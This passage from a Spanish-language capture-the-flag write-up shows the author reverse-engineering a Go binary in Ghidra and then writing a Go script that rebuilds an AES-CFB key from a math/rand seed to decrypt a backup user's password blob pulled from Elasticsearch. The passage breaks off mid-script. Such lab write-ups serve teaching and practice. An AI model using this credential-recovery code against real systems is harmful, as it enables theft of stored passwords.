+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>        1 file(s) copied.
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ file a.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>a.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 13 sections
+</span></span></code></pre></div>
+<p><code>ghidra</code> nos reporta que es un binario que ha sido compilado con <code>golang</code></p>
+<p>Detectamos la función <code>main</code>, por el camino he visto que se utilizan funciones relacionadas con operaciones criptográficas.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Podemos pasarle esta función a ChatGPT y nos responde lo siguiente:</p>
+<h3 id="1-carga-de-variables-de-entorno">1. <strong>Carga de variables de entorno</strong>:</h3>
+<ul>
+<li>El programa comienza cargando variables de entorno utilizando la función <code>os.Getenv</code>. Estas variables pueden estar relacionadas con configuraciones de la aplicación, como direcciones URL, claves de API, o configuraciones de entorno.</li>
+<li>Se menciona el uso de una biblioteca llamada <code>godotenv</code> (<code>github.com/joho/godotenv.Load</code>) que se utiliza comúnmente para cargar variables de entorno desde un archivo <code>.env</code>.</li>
+</ul>
+<h3 id="2-interacción-con-elasticsearch">2. <strong>Interacción con Elasticsearch</strong>:</h3>
+<ul>
+<li>La línea <code>local_270 = github.com/elastic/go-elasticsearch/v8.NewClient();</code> sugiere que el programa está creando un cliente para interactuar con una instancia de Elasticsearch. Elasticsearch es una base de datos de búsqueda y análisis.</li>
+<li>Hay varias llamadas a funciones dentro de la biblioteca de Elasticsearch, lo que indica que el programa podría estar ejecutando operaciones de búsqueda o indexación.</li>
+</ul>
+<h3 id="3-manejo-de-errores">3. <strong>Manejo de errores</strong>:</h3>
+<ul>
+<li>El código verifica constantemente el resultado de las operaciones y, en caso de error, utiliza funciones como <code>log.Fatal</code> o <code>log.Fatalf</code> para registrar el error y posiblemente terminar el programa.</li>
+<li><code>log.Fatal</code> y <code>log.Fatalf</code> son funciones comunes en Go para manejar errores fatales que deben finalizar el programa.</li>
+</ul>
+<h3 id="4-manejo-de-json">4. <strong>Manejo de JSON</strong>:</h3>
+<ul>
+<li>Hay una llamada a <code>encoding/json.Unmarshal</code>, lo que indica que el programa está deserializando (decodificando) datos en formato JSON a una estructura Go.</li>
+<li>También se menciona <code>encoding/json.Marshal</code>, lo que sugiere que hay serialización (codificación) de datos en formato JSON.</li>
+</ul>
+<h3 id="5-generación-de-claves-y-encriptación">5. <strong>Generación de claves y encriptación</strong>:</h3>
+<ul>
+<li>El código menciona <code>main.genKey</code> y <code>main.encrypt</code>, lo que sugiere que la aplicación está generando una clave y realizando operaciones de cifrado.</li>
+<li>Esto podría indicar que el programa maneja datos sensibles y necesita asegurar la información, posiblemente antes de enviarla a Elasticsearch o a otro sistema.</li>
+</ul>
+<h3 id="6-ejecución-de-comandos-del-sistema">6. <strong>Ejecución de comandos del sistema</strong>:</h3>
+<ul>
+<li>La función <code>os/exec.Command</code> y <code>os/exec.(*Cmd).CombinedOutput</code> se utilizan para ejecutar comandos del sistema operativo. Esto implica que el programa podría estar invocando comandos externos, posiblemente utilizando los datos que ha procesado.</li>
+<li>Esto puede ser peligroso si no se maneja correctamente, ya que la ejecución de comandos externos puede ser explotada si se insertan comandos maliciosos.</li>
+</ul>
+<h3 id="7-funcionalidades-adicionales">7. <strong>Funcionalidades adicionales</strong>:</h3>
+<ul>
+<li>Hay varias funciones mencionadas como <code>main.main.func1</code>, <code>main.main.func2</code>, <code>main.main.func3</code>, lo que sugiere que hay lógica adicional encapsulada en estas funciones.</li>
+<li><code>main.randStringList</code> sugiere la generación de una lista de cadenas aleatorias, lo que puede estar relacionado con la generación de claves, tokens, o identificadores únicos.</li>
+</ul>
+<h3 id="conclusión">Conclusión:</h3>
+<p>Este código parece ser parte de una aplicación Go que:</p>
+<ul>
+<li>Carga configuraciones desde variables de entorno.</li>
+<li>Interactúa con una instancia de Elasticsearch.</li>
+<li>Maneja datos JSON.</li>
+<li>Realiza operaciones de cifrado y generación de claves.</li>
+<li>Ejecuta comandos del sistema operativo.</li>
+</ul>
+<p>Dado el uso de <code>log.Fatal</code> y el manejo de errores fatales, parece que la aplicación está diseñada para terminar la ejecución si encuentra problemas críticos, como la imposibilidad de cargar configuraciones o conectarse a servicios externos.</p>
+<p>Me interesa la parte donde hace la operación criptográfica.</p>
+<p>Existe la función <code>main.encrypt</code> la cual supongo que encriptará el blob guardado en la base de datos. Esto quiero pensar que se hace habitualmente para ir rotando la contraseña del usuario <code>backup</code></p>
+<p>Y luego está la función <code>main.genKey</code> que es la utilizada para generar la semilla para realizar la encriptación.</p>
+<p>También necesito saber cual es el formato de encriptación, esto lo podemos descubrir rápidamente echando un vistazo en <code>main.encrypt</code>.</p>
+<p>Buscando el nombre de la clase, podemos revisar el código fuente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">func</span> newCFB(block Block, iv []<span style="color:#fff;font-weight:bold">byte</span>, decrypt <span style="color:#fff;font-weight:bold">bool</span>) Stream {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>	blockSize := block.BlockSize()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>	<span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">len</span>(iv) != blockSize {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>		<span style="color:#007f7f">// stack trace will indicate whether it was de or encryption
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#007f7f"></span>		<span style="color:#fff;font-weight:bold">panic</span>(<span style="color:#0ff;font-weight:bold">&#34;cipher.newCFB: IV length must equal block size&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>	x := &amp;cfb{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>		b:       block,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>		out:     <span style="color:#fff;font-weight:bold">make</span>([]<span style="color:#fff;font-weight:bold">byte</span>, blockSize),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>		next:    <span style="color:#fff;font-weight:bold">make</span>([]<span style="color:#fff;font-weight:bold">byte</span>, blockSize),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>		outUsed: blockSize,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>		decrypt: decrypt,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>	<span style="color:#fff;font-weight:bold">copy</span>(x.next, iv)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>	<span style="color:#fff;font-weight:bold">return</span> x
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>}</span></span></code></pre></div>
+<p><img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>El primer parámetro es el bloque a encriptar, el segundo parámetro el IV (Vector de Inicialización) y el tercer parámetro si está encriptado o desencriptando.</p>
+<p>Podemos detectar que probablemente se esté utilizando AES - modo CFB.</p>
+<p>Entonces para poder desencriptar la contraseña, necesito conseguir la <code>seed</code> del ElasticSearch junto a la contraseña encriptada,</p>
+<p>Una vez tengamos esto, podemos fácilmente desencriptar el bloque de datos utilizando la <code>seed</code> para generar la clave de encriptación.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Con ayuda de ChatGPT intenté generar un script para desencriptar el blob pero fallé.</p>
+<p>Así que probé a hacerlo en el lenguaje nativo del binario, Go.</p>
+<p>Como no tengo ni idea de Go he necesitado mucha ayuda de ChatGPT.</p>
+<p>Después de prueba y error un buen rato y pasarle la función <code>main.genKey</code> decompilada en ghidra y añadir la funcionalidad para conseguir la <code>seed</code> y el <code>blob</code> del Elastic, este es el script final.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1</span><span><span style="color:#fff;font-weight:bold">package</span> main
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3</span><span><span style="color:#fff;font-weight:bold">import</span> (
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4</span><span>	<span style="color:#0ff;font-weight:bold">&#34;bytes&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5</span><span>	<span style="color:#0ff;font-weight:bold">&#34;strings&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6</span><span>	<span style="color:#0ff;font-weight:bold">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7</span><span>	<span style="color:#0ff;font-weight:bold">&#34;strconv&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8</span><span>	<span style="color:#0ff;font-weight:bold">&#34;crypto/aes&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9</span><span>	<span style="color:#0ff;font-weight:bold">&#34;crypto/cipher&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10</span><span>	<span style="color:#0ff;font-weight:bold">&#34;encoding/base64&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11</span><span>	<span style="color:#0ff;font-weight:bold">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12</span><span>	<span style="color:#0ff;font-weight:bold">&#34;math/rand&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13</span><span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15</span><span><span style="color:#007f7f">// Función para conseguir la seed y el blob en base al script en python
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16</span><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">func</span> getSeedAndBlob() (<span style="color:#fff;font-weight:bold">int64</span>, <span style="color:#fff;font-weight:bold">string</span>, <span style="color:#fff;font-weight:bold">error</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17</span><span>	cmd := exec.Command(<span style="color:#0ff;font-weight:bold">&#34;python3&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;getData.py&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18</span><span>	<span style="color:#fff;font-weight:bold">var</span> out bytes.Buffer
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19</span><span>	cmd.Stdout = &amp;out
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20</span><span>	err := cmd.Run()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, err
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25</span><span>	output := out.String()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26</span><span>	parts := strings.Split(strings.TrimSpace(output), <span style="color:#0ff;font-weight:bold">&#34;|&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27</span><span>	<span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">len</span>(parts) != <span style="color:#ff0;font-weight:bold">2</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, fmt.Errorf(<span style="color:#0ff;font-weight:bold">&#34;unexpected output format&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31</span><span>	seed, err := strconv.ParseInt(parts[<span style="color:#ff0;font-weight:bold">0</span>], <span style="color:#ff0;font-weight:bold">10</span>, <span style="color:#ff0;font-weight:bold">64</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, err
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36</span><span>	blob := parts[<span style="color:#ff0;font-weight:bold">1</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37</span><span>	<span style="color:#fff;font-weight:bold">return</span> seed, blob, <span style="color:#fff;font-weight:bold">nil</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40</span><span><span style="color:#007f7f">// genKey genera una clave de 16 bytes basada en una semilla.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41</span><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">func</span> genKey(seed <span style="color:#fff;font-weight:bold">int64</span>) ([]<span style="color:#fff;font-weight:bold">byte</span>, <span style="color:#fff;font-weight:bold">error</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42</span><span>	rand.Seed(seed)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43</span><span>	key := <span style="color:#fff;font-weight:bold">make</span>([]<span style="color:#fff;font-weight:bold">byte</span>, <span style="color:#ff0;font-weight:bold">16</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44</span><span>	<span style="color:#fff;font-weight:bold">for</span> i := <span style="color:#ff0;font-weight:bold">0</span>; i &lt; <span style="color:#ff0;font-weight:bold">16</span>; i++ {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45</span><span>		key[i] = <span style="color:#fff;font-weight:bold">byte</span>(rand.Intn(<span style="color:#ff0;font-weight:bold">0xfe</span>) + <span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47</span><span>	<span style="color:#fff;font-weight:bold">return</span> key, <span style="color:#fff;font-weight:bold">nil</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50</span><span><span style="color:#007f7f">// decrypt desencripta el ciphertext base64 usando la clave generada.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51</span><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">func</span> decrypt(seed <span style="color:#fff;font-weight:bold">int64</span>, ciphertext <span style="color:#fff;font-weight:bold">string</span>) (<span style="color:#fff;font-weight:bold">string</span>, <span style="color:#fff;font-weight:bold">error</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52</span><span>	key, err := genKey(seed)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, err
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57</span><span>	<span style="color:#007f7f">// Decodifica el ciphertext base64
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58</span><span><span style="color:#007f7f"></span>	decodedCiphertext, err := base64.URLEncoding.DecodeString(ciphertext)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, err
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63</span><span>	<span style="color:#007f7f">// Verifica que el ciphertext tenga al menos el tamaño del bloque AES
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64</span><span><span style="color:#007f7f"></span>	<span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">len</span>(decodedCiphertext) &lt; aes.BlockSize {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, fmt.Errorf(<span style="color:#0ff;font-weight:bold">&#34;ciphertext is too short&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68</span><span>	<span style="color:#007f7f">// Extrae el IV del ciphertext
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69</span><span><span style="color:#007f7f"></span>	iv := decodedCiphertext[:aes.BlockSize]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70</span><span>	ciphertextBytes := decodedCiphertext[aes.BlockSize:]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72</span><span>	<span style="color:#007f7f">// Crea un nuevo bloque de cifrado AES en modo CFB
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73</span><span><span style="color:#007f7f"></span>	block, err := aes.NewCipher(key)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75</span><span>		<span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, err
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77</span><span>	stream := cipher.NewCFBDecrypter(block, iv)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79</span><span>	<span style="color:#007f7f">// Desencripta el ciphertext
